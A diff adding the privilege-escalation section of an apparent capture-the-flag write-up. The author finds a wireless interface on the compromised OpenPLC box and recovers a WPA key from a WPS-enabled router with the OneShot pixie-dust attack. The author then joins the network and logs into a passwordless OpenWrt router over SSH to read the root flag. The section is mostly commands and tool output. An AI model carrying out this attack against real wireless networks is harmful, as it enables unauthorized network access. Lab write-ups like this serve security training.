@@ -105,3 +105,147 @@ root@attica02:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
 cat /root/user.txt
 c9ae************************b381
 ```
+
+## Privileges escalation
+
+As we are already logged as root, the probable root flag may be stored on different machine. Further enumeration of the box revealed, that target has wireless interface:
+
+```bash
+root@attica02:~# ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:fb:30:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.0.3.3/24 brd 10.0.3.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet 10.0.3.44/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
+       valid_lft 2745sec preferred_lft 2745sec
+    inet6 fe80::216:3eff:fefb:30c8/64 scope link 
+       valid_lft forever preferred_lft forever
+6: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
+    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
+```
+
+and available wireless network:
+
+```bash
+root@attica02:~# iw dev wlan0 scan
+iw dev wlan0 scan
+BSS 02:00:00:00:01:00(on wlan0)
+        last seen: 36927.800s [boottime]
+        TSF: 1719238565617112 usec (19898d, 14:16:05)
+        freq: 2412
+        beacon interval: 100 TUs
+        capability: ESS Privacy ShortSlotTime (0x0411)
+        signal: -30.00 dBm
+        last seen: 0 ms ago
+        Information elements from Probe Response frame:
+        SSID: plcrouter
+        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
+        DS Parameter set: channel 1
+        ERP: Barker_Preamble_Mode
+        Extended supported rates: 24.0 36.0 48.0 54.0 
+        RSN:     * Version: 1
+                 * Group cipher: CCMP
+                 * Pairwise ciphers: CCMP
+                 * Authentication suites: PSK
+                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+        Supported operating classes:
+                 * current operating class: 81
+        Extended capabilities:
+                 * Extended Channel Switching
+                 * SSID List
+                 * Operating Mode Notification
+        WPS:     * Version: 1.0
+                 * Wi-Fi Protected Setup State: 2 (Configured)
+                 * Response Type: 3 (AP)
+                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
+                 * Manufacturer:  
+                 * Model:  
+                 * Model Number:  
+                 * Serial Number:  
+                 * Primary Device Type: 0-00000000-0
+                 * Device name:  
+                 * Config methods: Label, Display, Keypad
+                 * Version2: 2.0
+```
+
+To exploit the WPS, we can utilize [OneShot](https://github.com/kimocoder/OneShot) tool:
+
+```bash
+root@attica02:~# python3 oneshot.py -i wlan0 -K
+python3 oneshot.py -i wlan0 -K
+[*] Running wpa_supplicant…
+[*] BSSID not specified (--bssid) — scanning for available networks
+Networks list:
+#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
+1)   02:00:00:00:01:00  plcrouter                 WPA2     -30                                 
+Select target (press Enter to refresh): 1
+[*] Running wpa_supplicant…
+[*] Trying PIN '12345670'…
+[*] Scanning…
+[*] Authenticating…
+[+] Authenticated
+[*] Associating with AP…
+[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
+[*] Received Identity Request
+[*] Sending Identity Response…
+[*] Received WPS Message M1
+[P] E-Nonce: ************
+[*] Sending WPS Message M2…
+[P] PKR: ************
+[P] PKE: ************
+[P] AuthKey: ************
+[*] Received WPS Message M3
+[P] E-Hash1: ************
+[P] E-Hash2: ************
+[*] Sending WPS Message M4…
+[*] Received WPS Message M5
+[+] The first half of the PIN is valid
+[*] Sending WPS Message M6…
+[*] Received WPS Message M7
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'NoW************23!'
+[+] AP SSID: 'plcrouter'
+
+```
+
+The tool was able to retrieve PSK for network `plcrouter`. To connect to the network, we can use Unix tool `wpa_supplicant`:
+
+```bash
+root@attica02:~# wpa_passphrase plcrouter 'NoW************23!' > key
+root@attica02:~# wpa_supplicant -B -c key -i wlan0
+root@attica02:~# ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
+```
+
+with assigned IP address, we can try to log into the router:
+
+```bash
+root@attica02:~# ssh root@192.168.1.1
+
+
+BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ OpenWrt 23.05.2, r23630-842932a63d
+ -----------------------------------------------------
+=== WARNING! =====================================
+There is no root password defined on this device!
+Use the "passwd" command to set up a new password
+in order to prevent unauthorized SSH logins.
+--------------------------------------------------
+root@ap:~# ls
+root.txt
+root@ap:~# cat root.txt 
+e85c************************8e85
+```
